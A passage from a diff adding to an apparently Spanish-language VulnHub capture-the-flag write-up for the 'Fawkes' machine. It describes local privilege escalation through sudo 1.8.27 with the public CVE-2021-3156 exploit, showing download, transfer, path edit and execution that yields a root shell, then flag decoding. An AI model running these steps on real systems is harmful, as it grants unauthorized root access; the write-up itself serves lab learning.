+El problema es que si lo ejecutamos, nos pedirá que introduzcamos la contraseña del **Root** que no tenemos. Otra opción sería usar **GTFOBins**, pero tampoco nos ayudará en este caso por lo mismo.
+
+Veamos la versión del binario y busquemos un Exploit:
+```bash
+neville@Fawkes:~$ /usr/local/bin/sudo --version
+Sudo version 1.8.27
+Sudoers policy plugin version 1.8.27
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.27
+```
+Podemos encontrar un Exploit con **searchsploit** para esta versión, pero este no funcionará.
+
+Si buscamos por internet, podemos encontrar estas dos versiones:
+* <a href="https://github.com/worawit/CVE-2021-3156" target="_blank">Repositorio de worawit: CVE-2021-3156</a>
+* <a href="https://github.com/0xdevil/CVE-2021-3156" target="_blank">Repositorio de 0xdevil: CVE-2021-3156</a>
+
+Cualquiera de los dos funciona, únicamente, tenemos que indicarle la ruta del binario sudo para que funcione.
+
+En mi caso, usaré el primero.
+
+Podemos descargar el script de **Python** que menciona el **GitHub** y probarlo o solamente copiar el código y guardarlo en la máquina víctima.
+
+Por pura práctica, lo haré de la primer forma.
+
+Descargamos el script:
+```bash
+wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py
+--2024-11-19 13:46:35--  https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 8179 (8.0K) [text/plain]
+Saving to: ‘exploit_nss.py’
+
+exploit_nss.py               100%[=======================================>]   7.99K  --.-KB/s    in 0.001s  
+
+2024-11-19 13:46:35 (6.42 MB/s) - ‘exploit_nss.py’ saved [8179/8179]
+```
+
+Y lo pasamos a la máquina víctima con **scp**:
+```bash
+scp exploit_nss.py neville@192.168.1.007:/home/neville
+neville@192.168.1.007's password: 
+exploit_nss.py
+```
+
+Nos logueamos y modificamos el script para que tenga la ruta correcta del binario sudo que vamos a explotar:
+```python
+SUDO_PATH = b"/usr/local/bin/sudo"
+```
+
+Y lo ejecutamos:
+```bash
+neville@Fawkes:~$ chmod +x exploit_nss.py
+neville@Fawkes:~$ python3 exploit_nss.py 
+# whoami
+root
+```
+
+Ya solamente buscamos el último horocrux:
+```bash
+# cd /root
+# ls
+horcrux3.txt
+# cat horcrux3.txt
+__     __    _     _                           _     _     
+\ \   / /__ | | __| | ___ _ __ ___   ___  _ __| |_  (_)___ 
+ \ \ / / _ \| |/ _` |/ _ \ '_ ` _ \ / _ \| '__| __| | / __|
+  \ V / (_) | | (_| |  __/ | | | | | (_) | |  | |_  | \__ \
+   \_/ \___/|_|\__,_|\___|_| |_| |_|\___/|_|   \__| |_|___/
+                                                           
+     _       __            _           _ 
+  __| | ___ / _| ___  __ _| |_ ___  __| |
+ / _` |/ _ \ |_ / _ \/ _` | __/ _ \/ _` |
+| (_| |  __/  _|  __/ (_| | ||  __/ (_| |
+ \__,_|\___|_|  \___|\__,_|\__\___|\__,_|
+                                         
+Machine Author: Mansoor R (@time4ster)
+Machine Difficulty: Hard
+Machine Name: Fawkes
+Horcruxes Hidden in this VM: 3 horcruxes
+
+You have successfully pwned Fawkes machine & defeated Voldemort.
+Here is your last hocrux: horcrux_{ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==}
+
+# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
+```
+Con esto, hemos completado la máquina y esta serie de **VulnHub**.
+
+Veamos qué dicen los horocruxes:
+```bash
+# Horocrux 6:
+echo -n "NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=" | base64 -d
+6: HaRrY PotTer dEsTrOyed by volDeMorT                                                                                                                                                                                                                 
+
+# Horocrux 7:
+echo -n "NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t" | base64 -d
+7: NaGiNi tHe SnAke deStroYed By NeVille LonGboTTom                                                                                                                                                                                                                 
+
+# Horcrux 8:
+echo -n "ODogVm9sRGVNb3JUIGRFZmVBdGVkIGJZIGhBcnJZIFBvVFRlUg==" | base64 -d
+8: VolDeMorT dEfeAted bY hArrY PoTTeR
+```
+Completado.
 
 
 <br>
@@ -1032,7 +1360,15 @@ Con esto, hemos ejecutado un **Buffer Overflow** exitosamente.
 </div>
 
 
-links
+* https://serverfault.com/questions/189144/what-is-monkeycom-on-port-9898
+* https://keepcoding.io/blog/que-es-un-buffer-overflow/
+* https://www.fortinet.com/lat/resources/cyberglossary/buffer-overflow
+* https://www.cloudflare.com/es-es/learning/security/threats/buffer-overflow/
+* https://www.gdbtutorial.com/tutorial/commands
+* https://github.com/hugsy/gef
+* https://stackoverflow.com/questions/46631666/how-i-can-to-capture-ftp-data-packets-via-tcpdump
+* https://github.com/0xdevil/CVE-2021-3156
+* https://github.com/worawit/CVE-2021-3156
 
 
 <br>
